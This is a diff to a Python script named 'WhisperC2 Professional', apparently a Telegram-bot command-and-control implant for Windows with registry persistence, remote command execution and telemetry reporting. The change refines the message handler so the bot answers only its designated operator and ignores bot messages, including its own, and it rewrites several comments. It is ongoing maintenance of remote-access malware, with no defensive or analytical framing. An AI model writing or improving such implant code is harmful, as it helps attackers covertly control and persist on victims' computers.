@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # =============================================================================
-# WhisperC2 Professional – Persistence Fixed, Classic Telemetry
+# WhisperC2 Professional – Self‑Reply Fix + Persistence Fixed
 # =============================================================================
 import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
 import shutil, winreg, ctypes, requests
@@ -92,7 +92,7 @@ def save_pid():
 atexit.register(lambda: PID_FILE.unlink(missing_ok=True) if PID_FILE.exists() else None)
 
 # -----------------------------------------------------------------------------
-# Original Classic Telemetry (Simple & Beautiful)
+# Classic Telemetry
 # -----------------------------------------------------------------------------
 def generate_telemetry_report(status: str) -> str:
     color = "#4CAF50" if status == "online" else "#F44336"
@@ -328,7 +328,7 @@ def execute_command(cmd_line: str, topic_id):
         return f"❓ Unknown: {cmd}", None
 
 # -----------------------------------------------------------------------------
-# Main
+# Main – DOUBLE‑LOCKED bot message filter
 # -----------------------------------------------------------------------------
 def main():
     try:
@@ -352,8 +352,13 @@ def main():
         log(f"Operational: topic_id={topic_id}, persistence={install_persistence()}")
 
         def _handler_wrapper(message):
-            if message.from_user.id != OPERATOR_CHAT_ID or message.from_user.is_bot:
+            # 1. IGNORE ALL BOT MESSAGES (including our own) – double‑locked
+            if message.from_user.is_bot:
                 return
+            # 2. Only respond to the designated operator
+            if message.from_user.id != OPERATOR_CHAT_ID:
+                return
+            # 3. Topic isolation
             if topic_id is not None:
                 if getattr(message, 'message_thread_id', None) != topic_id:
                     return
